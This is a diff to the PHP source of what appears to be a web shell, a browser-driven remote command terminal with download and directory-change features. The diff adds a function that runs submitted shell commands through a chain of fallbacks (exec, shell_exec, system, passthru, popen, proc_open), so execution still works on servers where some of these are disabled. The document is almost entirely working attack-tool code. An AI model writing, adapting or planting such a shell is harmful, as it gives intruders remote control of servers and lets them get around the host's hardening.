@@ -9,8 +9,8 @@ function expandPath($path) {
 }
 
 function featureShell($cmd, $cwd) {
-    $stdout = array();
-
+    $stdout = "";
+    
     if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
         chdir(expandPath("~"));
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
@@ -23,13 +23,53 @@ function featureShell($cmd, $cwd) {
         return featureDownload($match[1]);
     } else {
         chdir($cwd);
-        exec($cmd, $stdout);
+        $stdout = executeCommand($cmd);
     }
 
     return array(
         "stdout" => $stdout,
         "cwd" => getcwd()
     );
+}
+
+function executeCommand($cmd) {
+    $output = "";
+    if (function_exists("exec")) {
+        exec($cmd, $output);
+        $output = implode("\n", $output);
+    } else if (function_exists("shell_exec")) {
+        $output = shell_exec($cmd);
+    } else if (function_exists("system")) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(["passthru", "ob_start", "ob_get_contents", "ob_end_clean"])) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } else if (allFunctionExist(["popen", "feof", "fread", "pclose"])) {
+        $handle = popen($cmd, 'r');
+        while (!feof($handle)) {
+            $output .= fread($handle, 4096);
+        }
+        pclose($handle);
+    } else if (allFunctionExist(["proc_open", "stream_get_contents", "pclose"])) {
+        $handle = proc_open($cmd, [0 => ["pipe", "r"], 1 => ["pipe", "w"]], $pipes);
+        $output = stream_get_contents($pipes[1]);
+        pclose($handle);
+    }
+    return $output;
+}
+
+function allFunctionExist($list = []) {
+    foreach ($list as $entry) {
+        if (!function_exists($entry)) {
+            return false;
+        }
+    }
+    return true;
 }
 
 function featurePwd() {
@@ -295,7 +335,7 @@ if (isset($_GET["feature"])) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(response.name, response.file)
                         } else {
-                            _insertStdout(response.stdout.join("\n"));
+                            _insertStdout(response.stdout);
                             updateCwd(response.cwd);
                         }
                     });
